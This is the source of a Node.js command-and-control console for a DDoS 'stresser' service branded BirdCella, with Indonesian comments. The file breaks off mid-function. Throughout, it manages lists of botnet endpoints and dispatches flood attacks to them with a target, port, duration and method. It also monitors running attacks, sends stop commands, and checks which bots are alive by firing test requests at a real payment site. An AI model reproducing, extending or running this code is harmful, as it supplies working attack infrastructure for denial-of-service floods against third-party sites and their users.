
const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.9'
let processList = [];
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const teks_hitam = '\x1b[30m'; // Teks hitam
const back_biru = '\x1b[44m'; // Latar belakang biru
const back_ungu = '\x1b[45m'; // Latar belakang ungu
const back_biru_ungu = '\x1b[48;2;128;0;255m';
const biruUnguMuda = '\x1b[38;2;173;150;255m';


const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
[ \x1b[32mSYSTEM\x1b[0m ] Welcome To BirdCella Tools
[ \x1b[32mSYSTEM\x1b[0m ] Owner @BirdCella

    ____                   _            _____ __                               
   / __ \___  ____  ____  (_)_  _______/ ___// /_________  _____________  _____
 \x1b[34m / /_/ / _ \/ __ \/_  / / / / / / ___/\__ \/ __/ ___/ _ \/ ___/ ___/ _ \/ ___/
 / _, _/  __/ / / / / /_/ / /_/ (__  )___/ / /_/ /  /  __(__  |__  )  __/ /    
/_/ |_|\___/_/ /_/ /___/_/\__,_/____//____/\__/_/   \___/____/____/\___/_/                                                                            \x1b[0m
\x1b[1m
\x1b[31m| \x1b[34mUser: \x1b[32mBirdCella \x1b[31m| \x1b[34mVip: \x1b[32mVip \x1b[31m| \x1b[34mSuperVip: \x1b[32m Mega Vip
\x1b[31m| \x1b[34mAdmin:\x1b[32m BirdCella \x1b[31m| \x1b[34mExperid:\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited 
\x1b[31m| \x1b[36mCellaStresser C2-API 2025-2026 \x1b[31m| \x1b[36mt.me/BirdCella\x1b[0m

Please Type \x1b[1m\x1b[36mhelp\x1b[0m  For Show All Menu
\x1b[34m______________________________________________________________________________\x1b[0m
`)}
// [========================================] //
async function bootup() {
  try {
    // Clear the console screen first
    console.clear();
    
    // Display the banner
    console.log(`            
[ \x1b[32mSYSTEM\x1b[0m ] Welcome Cuy Yang sudah Beli/Pemilik
[ \x1b[32mSYSTEM\x1b[0m ] Owner @BirdCella

    ____                   _            _____ __                               
   / __ \___  ____  ____  (_)_  _______/ ___// /_________  _____________  _____
 \x1b[34m / /_/ / _ \/ __ \/_  / / / / / / ___/\__ \/ __/ ___/ _ \/ ___/ ___/ _ \/ ___/
 / _, _/  __/ / / / / /_/ / /_/ (__  )___/ / /_/ /  /  __(__  |__  )  __/ /    
/_/ |_|\___/_/ /_/ /___/_/\__,_/____//____/\__/_/   \___/____/____/\___/_/                                                                            \x1b[0m
\x1b[1m
\x1b[31m| \x1b[34mUser: \x1b[32mBirdcella \x1b[31m| \x1b[34mVip: \x1b[32mVip \x1b[31m| \x1b[34mSuperVip: \x1b[32m Mega Vip
\x1b[31m| \x1b[34mAdmin:\x1b[32m BirdCella \x1b[31m| \x1b[34mExperid:\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited

\x1b[1m\x1b[35mAnda Menggunakan tools Rens C2
\x1b[1m\x1b[32mSilahkan Masukan Data Username Dan Password
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${back_putih}${teksmerah} SELAMAT DATANG DAN SILAHKAN LOGIN${Reset}                                                                               
    `);

    // Fetch the username from the new URL
    const usernameResponse = await fetch('https://pastebin.com/raw/cUT1YSsM');
    const validUsername = await usernameResponse.text(); // Expected to get the username from the text

    // Fetch the password from the new URL
    const passwordResponse = await fetch('https://pastebin.com/raw/cGCEitNH');
    const validPassword = await passwordResponse.text(); // Expected to get the password from the text

    // Prompt for username
    permen.question(`${back_putih}${teksmerah}Username${Reset}: `, (username) => {
      if (username.trim() === validUsername.trim()) {
        // If username is correct, prompt for password
        permen.question(`${back_putih}${teksmerah}Password${Reset}: `, (password) => {
          if (password.trim() === validPassword.trim()) {
            // Successful login
            console.log(`Successfully Logged in!`);
            console.clear();
            console.log(`Welcome to ${biru}Dzky${Reset} ${hijau}DDoS Tools!${Reset}${version}`);
            sleep(1000); // No need for await if sleep is synchronous
            banner();
            console.log(`Type ${hijau}"help"${Reset} for showing all available commands.`);
            sigma();
          } else {
            // Wrong password
            console.log(`makanya buy di BirdCella`);
            process.exit(-1);
          }
        });
      } else {
        // Wrong username
        console.log(`makanya buy di BirdCella`);
        process.exit(-1);
      }
    });
  } catch (error) {
    console.log(`ampass jaringan lu`);
  }
}
// [========================================] //
// Fungsi untuk menampilkan daftar API
async function listBotnetEndpoints() {
    let botnetData;
    
    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Jika tidak ada endpoints
    if (botnetData.endpoints.length === 0) {
        console.log('No endpoints found in botnet.');
        sigma();
        return;
    }

    // Tampilkan daftar endpoint
    console.log('\x1b[1m\x1b[35m[==== List of Botnet Endpoints ====]\x1b[0m');
    botnetData.endpoints.forEach((endpoint, index) => {
        console.log(`${index + 1}. ${endpoint}. ${Reset}`);
    });
    console.log('────────────────────────────────');
     sigma();
}
// [========================================] //
async function deleteBotnetEndpoint(args) {
    if (args.length < 1) {
        console.log(`Example: delapi <endpoint>
delapi http://1.1.1.1:2000`);
        sigma();
        return;
    }

    const endpointToDelete = args[0];

    // Load botnet data
    let botnetData;
    try {
        const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
        botnetData = JSON.parse(data);
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return;
    }

    // Check if endpoint exists
    const index = botnetData.endpoints.indexOf(endpointToDelete);
    if (index === -1) {
        console.log(`Endpoint ${endpoint} not found in the botnet list.`);
        sigma();
        return;
    }

    // Remove endpoint
    botnetData.endpoints.splice(index, 1);

    // Save updated data
    try {
        await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        console.log(`Endpoint ${endpoint} has been removed from the botnet.`);
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }

    sigma();
}
//========================================//

async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack <target> <port> <duration> <methods>
botnet https://google.com 443 120 flood`);
        sigma();
        return;
    }
    const [target, port, duration, methods] = args;
    let result;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;
        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, port, methods, startTime, duration, endTime, ip: result.query });
        console.clear();
        console.log(`
\x1b[1m\x1b[35m
    ____                   _            _____ __                               
   / __ \___  ____  ____  (_)_  _______/ ___// /_________  _____________  _____
 \x1b[34m / /_/ / _ \/ __ \/_  / / / / / / ___/\__ \/ __/ ___/ _ \/ ___/ ___/ _ \/ ___/
 / _, _/  __/ / / / / /_/ / /_/ (__  )___/ / /_/ /  /  __(__  |__  )  __/ /    
/_/ |_|\___/_/ /_/ /___/_/\__,_/____//____/\__/_/   \___/____/____/\___/_/                                                                            \x1b[0m
\x1b[1m
\x1b[31m| \x1b[34mUser: \x1b[32mBirdCella \x1b[31m| \x1b[34mVip: \x1b[32mVip \x1b[31m| \x1b[34mSuperVip: \x1b[32m Mega Vip
\x1b[31m| \x1b[34mAdmin:\x1b[32m BirdCella \x1b[31m| \x1b[34mExperid:\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited 
\x1b[31m| \x1b[36mBirdCellaStresser C2-API 2025-2026 \x1b[31m| \x1b[36mt.me/BirdCella\x1b[0m

\x1b[95m EXPIRY : \x1b[94m 2739.73 Millenium (s)
\x1b[95m LOD    : \x1b[94m SSHH-2.0 PuTTY_Realese_0.84

\x1b[97m Please Type \x1b[92m "Help" \x1b[97m For more information
-----------------------------------------------------------------------------------
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[37m Send Attack To All Server
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[37m Attack Sent
\x1b[37m | \x1b[97m TARGET \x1b[37m : \x1b[31m ( \x1b[96m${target}\x1b[91m )
\x1b[37m | \x1b[97m PORT \x1b[37m   : \x1b[31m ( \x1b[96m${port}\x1b[91m )
\x1b[37m | \x1b[97m TIME \x1b[37m   : \x1b[31m ( \x1b[96m${duration}\x1b[91m )
\x1b[37m | \x1b[97m METHODS \x1b[37m: \x1b[31m ( \x1b[96m${methods}\x1b[91m )
\x1b[37m | \x1b[97m ASN \x1b[37m    : \x1b[31m ( \x1b[96m${result.as}\x1b[91m )
\x1b[37m | \x1b[97m IP \x1b[37m     : \x1b[31m ( \x1b[96m${result.query}\x1b[91m )
\x1b[37m | \x1b[97m ISP \x1b[37m    : \x1b[31m ( \x1b[96m${result.isp}\x1b[91m )
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[97m (Powered By t.me/BirdCella)
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
const requests = botnetData.endpoints.map(async (endpoint) => {
    const apiUrl = `${endpoint}&host=${target}&port=${port}&time=${duration}&method=${methods}`;

    try {
        const response = await fetch(apiUrl);

        if (response.ok) {
            return 1; // Server online
        } else {
            console.error(`Permintaan ke ${apiUrl} gagal dengan status ${response.status}`);
            return 0; // Server offline
        }
    } catch (error) {
        console.error(`Terjadi kesalahan saat mengirim permintaan ke ${apiUrl}:`, error);
        return 0; // Server offline karena error
    }
});

// Menunggu hingga semua permintaan selesai
Promise.all(requests).then((results) => {
    // Lakukan sesuatu dengan hasilnya
    console.log(results);
}).catch((error) => {
    console.error('Terjadi kesalahan dalam salah satu permintaan:', error);
});

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnvet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}
//==============================================\\
async function AttackBotnetL4(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack <target> <port> <duration> <methods>
botnet https://google.com 443 120 flood`);
        sigma();
        return;
    }
    const [target, port, duration, methods] = args;
    try {
        console.clear();
        console.log(`\x1b[1m\x1b[35m
        
        
        
        
                
                  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩         \x1b[0m
        
     \x1b[1;35m  ╔══════════════════════════════════════════════════╗
                  \x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULLY SENT \x1b[41m\x1b[41m!\x1b[0m

         \x1b[1;37m    HOST🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
         \x1b[1;37m    PORT🛰️    : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
         \x1b[1;37m    TIME🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
         \x1b[1;37m    METHOD🔮 : \x1b[1;35m[\x1b[1m\x1b[36m${methods}\x1b[1;35m]
         \x1b[1;37m    SENT BY💻: \x1b[1;35m[\x1b[1m\x1b[36mBirdCella\x1b[1;35m]
       ╚══════════════════════════════════════════════════╝
            ⚠️ \x1b[31mKETIK STOP UNTUK MENGHENTIKAN SERANGAN\x1b[1;35m⚠️
                   \x1b[36mCONCURENT\x1b[1;35m \x1b[1;37m: 1x HTTP2\x1b[1;35m

========================================================================
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    // Misalkan botnetData.endpoints adalah array dari URL endpoint
const requests = botnetData.endpoints.map(async (endpoint) => {
    // Mengganti URL API sesuai dengan format baru
    const apiUrl = `${endpoint}&host=${target}&port=${port}&time=${duration}&method=${methods}`;

    try {
        // Mengirim permintaan menggunakan fetch
        const response = await fetch(apiUrl);
        
        // Menangani respons jika berhasil
        if (response.ok) {
            const data = await response.json(); // atau response.text() tergantung data yang diharapkan
            return data;
        } else {
            console.error(`Permintaan ke ${apiUrl} berhasil dengan status ${response.status}`);
        }
    } catch (error) {
        console.error(`Terjadi kesalahan saat mengirim permintaan ke ${apiUrl}:`, error);
    }
});

// Menunggu hingga semua permintaan selesai
Promise.all(requests).then((results) => {
    // Lakukan sesuatu dengan hasilnya
    console.log(results);
}).catch((error) => {
    console.error('Terjadi kesalahan dalam salah satu permintaan:', error);
});

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnvet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}
//==============================================\\
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
add-botnet http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/api/Cella?key=Cella';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return;           
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitormonitorAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n";
    attackDetails += `\n`;
    attackDetails += `  NO  │        HOST          │ SINCE │ DURATION │ METHOD  \n`;
    attackDetails +=` ─────┼──────────────────────┼───────┼──────────┼─────────\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `  ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since). padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} \n`;
    });

    // Garis bawah tabel
    attackDetails += `\n`;

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}&host=https://pay.amazon.com&port=443&time=1&method=TLS`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}
// [========================================] //
async function sendStopRequest() {
  try {
    // Baca file botnet.json untuk mendapatkan daftar endpoint
    const data = fs.readFileSync('./lib/botnet.json', 'utf-8');
    const jsonData = JSON.parse(data);
    const endpoints = jsonData.endpoints;

    // Kirim request ke setiap endpoint dengan method=STOP
    for (const endpoint of endpoints) {
      const url = `${endpoint}&host=https://gogle.com&port=443&time=1&method=STOP`;
      const response = await fetch(url, { method: 'GET' }); // bisa diganti ke POST jika diperlukan
      if (response.ok) {
        console.log(` \x1b[1m\x1b[35m
        
        ╔═╗╔╦╗╔═╗╔═╗  ╔═╗╦  ╦    ╔═╗╔═╗╦═╗╦  ╦╔═╗╦═╗
        ╚═╗ ║ ║ ║╠═╝  ╠═╣║  ║    ╚═╗║╣ ╠╦╝╚╗╔╝║╣ ╠╦╝
        ╚═╝ ╩ ╚═╝╩    ╩ ╩╩═╝╩═╝  ╚═╝╚═╝╩╚═ ╚╝ ╚═╝╩╚═
        \x1b[0m
        
        `);
        sigma();
        return;
      } else {
        console.error(`Request ke ${url} gagal dengan status ${response.status}.`);
      }
    }
  } catch (error) {
    console.error('Terjadi kesalahan:', error);
    
    
  }
}
//===========fitur stop panel=================================\\
async function sendStopPanel() {
  try {
    // Baca file botnet.json untuk mendapatkan daftar endpoint
    const data = fs.readFileSync('./lib/panel.json', 'utf-8');
    const jsonData = JSON.parse(data);
    const endpoints = jsonData.endpoints;

    // Kirim request ke setiap endpoint dengan method=STOP
    for (const endpoint of endpoints) {
      const url = `${endpoint}?target=http://google.com&port=443&time=200&methods=stop`;
      const response = await fetch(url, { method: 'GET' }); // bisa diganti ke POST jika diperlukan
      if (response.ok) {
        console.log(` \x1b[1m\x1b[35m
        
        ╔═╗╔╦╗╔═╗╔═╗  ╔═╗╦  ╦    ╔═╗╔═╗╦═╗╦  ╦╔═╗╦═╗
        ╚═╗ ║ ║ ║╠═╝  ╠═╣║  ║    ╚═╗║╣ ╠╦╝╚╗╔╝║╣ ╠╦╝
        ╚═╝ ╩ ╚═╝╩    ╩ ╩╩═╝╩═╝  ╚═╝╚═╝╩╚═ ╚╝ ╚═╝╩╚═
        \x1b[0m
        
        `);
        sigma();
        return;
      } else {
        console.error(`Request ke ${url} gagal dengan status ${response.status}.`);
      }
    }
  } catch (error) {
    console.error('Terjadi kesalahan:', error);
    
    
  }
}
//===============fitur botnet via panel======L7======================\\
async function AttackBotnetPanel(args) {
    if (args.length < 3) {
        console.log(`Example: botnet <target> <duration> <methods>
botnet http://google.com 120 flood`);
        sigma();
        return;
    }
    const [target, port, duration, methods] = args;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;
        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // Get current date and time
        const now = new Date();
        const currentDateTime = now.toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
        });

        // Load botnet data
        try {
            botnetData = JSON.parse(fs.readFileSync('./lib/panel.json', 'utf8'));
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Send requests to each endpoint
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&port=${port}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error sending request to ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // Save valid endpoints back to the file
        botnetData.endpoints = validEndpoints;
        try {
            fs.writeFileSync('./lib/panel.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            sigma();
        }

        // Reply with the results
        console.log(`
\x1b[1m\x1b[35m
    ____                   _            _____ __                               
   / __ \___  ____  ____  (_)_  _______/ ___// /_________  _____________  _____
 \x1b[34m / /_/ / _ \/ __ \/_  / / / / / / ___/\__ \/ __/ ___/ _ \/ ___/ ___/ _ \/ ___/
 / _, _/  __/ / / / / /_/ / /_/ (__  )___/ / /_/ /  /  __(__  |__  )  __/ /    
/_/ |_|\___/_/ /_/ /___/_/\__,_/____//____/\__/_/   \___/____/____/\___/_/                                                                            \x1b[0m
\x1b[1m
\x1b[31m| \x1b[34mUser: \x1b[32mBirdCella \x1b[31m| \x1b[34mVip: \x1b[32mVip \x1b[31m| \x1b[34mSuperVip: \x1b[32m Mega Vip
\x1b[31m| \x1b[34mAdmin:\x1b[32m BirdCella \x1b[31m| \x1b[34mExperid:\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited 
\x1b[31m| \x1b[36mBirdCellaStresser C2-API 2025-2026 \x1b[31m| \x1b[36mt.me/BirdCella\x1b[0m

\x1b[95m EXPIRY : \x1b[94m 2739.73 Millenium (s)
\x1b[95m LOD    : \x1b[94m SSHH-2.0 PuTTY_Realese_0.84

\x1b[97m Please Type \x1b[92m "Help" \x1b[97m For more information
-----------------------------------------------------------------------------------
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[37m Send Attack To All Server
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[37m Attack Sent
\x1b[37m | \x1b[97m TARGET \x1b[37m : \x1b[31m ( \x1b[96m${target}\x1b[91m )
\x1b[37m | \x1b[97m PORT \x1b[37m   : \x1b[31m ( \x1b[96m${port}\x1b[91m )
\x1b[37m | \x1b[97m TIME \x1b[37m   : \x1b[31m ( \x1b[96m${duration}\x1b[91m )
\x1b[37m | \x1b[97m METHODS \x1b[37m: \x1b[31m ( \x1b[96m${methods}\x1b[91m )
\x1b[37m | \x1b[97m ASN \x1b[37m    : \x1b[31m ( \x1b[96m${result.as}\x1b[91m )
\x1b[37m | \x1b[97m IP \x1b[37m     : \x1b[31m ( \x1b[96m${result.query}\x1b[91m )
\x1b[37m | \x1b[97m ISP \x1b[37m    : \x1b[31m ( \x1b[96m${result.isp}\x1b[91m )
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[97m (Powered By t.me/BirdCella)
`);
        sigma();
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
//===============fitur botnet via panel======L4======================\\
async function AttackBotnetPanell4(args) {
    if (args.length < 3) {
    console.log(`Example: botnet <target> <duration> <methods>
botnet http://google.com 120 flood`);
    sigma();
	return
}
 const [target, port, duration, methods] = args;
    try {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];
    
    
    
        // Get current date and time
        const now = new Date();
        const currentDateTime = now.toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
        });

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/panel.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&port=${port}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/panel.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`
\x1b[1m\x1b[35m
    ____                   _            _____ __                               
   / __ \___  ____  ____  (_)_  _______/ ___// /_________  _____________  _____
 \x1b[34m / /_/ / _ \/ __ \/_  / / / / / / ___/\__ \/ __/ ___/ _ \/ ___/ ___/ _ \/ ___/
 / _, _/  __/ / / / / /_/ / /_/ (__  )___/ / /_/ /  /  __(__  |__  )  __/ /    
/_/ |_|\___/_/ /_/ /___/_/\__,_/____//____/\__/_/   \___/____/____/\___/_/                                                                            \x1b[0m
\x1b[1m
\x1b[31m| \x1b[34mUser: \x1b[32mBirdCella \x1b[31m| \x1b[34mVip: \x1b[32mVip \x1b[31m| \x1b[34mSuperVip: \x1b[32m Mega Vip
\x1b[31m| \x1b[34mAdmin:\x1b[32m BirdCella \x1b[31m| \x1b[34mExperid:\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited 
\x1b[31m| \x1b[36mBirdCellaStresser C2-API 2025-2026 \x1b[31m| \x1b[36mt.me/BirdCella\x1b[0m

\x1b[95m EXPIRY : \x1b[94m 2739.73 Millenium (s)
\x1b[95m LOD    : \x1b[94m SSHH-2.0 PuTTY_Realese_0.84

\x1b[97m Please Type \x1b[92m "Help" \x1b[97m For more information
-----------------------------------------------------------------------------------
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[37m Send Attack To All Server
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[37m Attack Sent
\x1b[37m | \x1b[97m TARGET \x1b[37m : \x1b[31m ( \x1b[96m${target}\x1b[91m )
\x1b[37m | \x1b[97m PORT \x1b[37m   : \x1b[31m ( \x1b[96m${port}\x1b[91m )
\x1b[37m | \x1b[97m TIME \x1b[37m   : \x1b[31m ( \x1b[96m${duration}\x1b[91m )
\x1b[37m | \x1b[97m METHODS \x1b[37m: \x1b[31m ( \x1b[96m${methods}\x1b[91m )
\x1b[37m | \x1b[97m ASN \x1b[37m    : \x1b[31m ( \x1b[96m${result.as}\x1b[91m )
\x1b[37m | \x1b[97m IP \x1b[37m     : \x1b[31m ( \x1b[96m${result.query}\x1b[91m )
\x1b[37m | \x1b[97m ISP \x1b[37m    : \x1b[31m ( \x1b[96m${result.isp}\x1b[91m )
\x1b[37m [ \x1b[94m SYSTEM \x1b[37m ] \x1b[97m (Powered By t.me/BirdCella)
`);
    sigma()
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
//========================================================\\
async function monitorPanelmonitorAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails ="\n\n";
    attackDetails += `\n`;
    attackDetails += `  NO  │        HOST          │ SINCE │ DURATION │ METHOD  \n`;
    attackDetails +=` ─────┼──────────────────────┼───────┼──────────┼─────────\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const target = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `  ${String(index + 1).padEnd(3)} │ ${target.padEnd(20)} │ ${String(since). padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} \n`;
    });

    // Garis bawah tabel
    attackDetails += `\n`;

    console.log(attackDetails);
    sigma();
}
//===========================================\\
async function processBotnetPanel(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/putraganteng';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/panel.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/panel.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
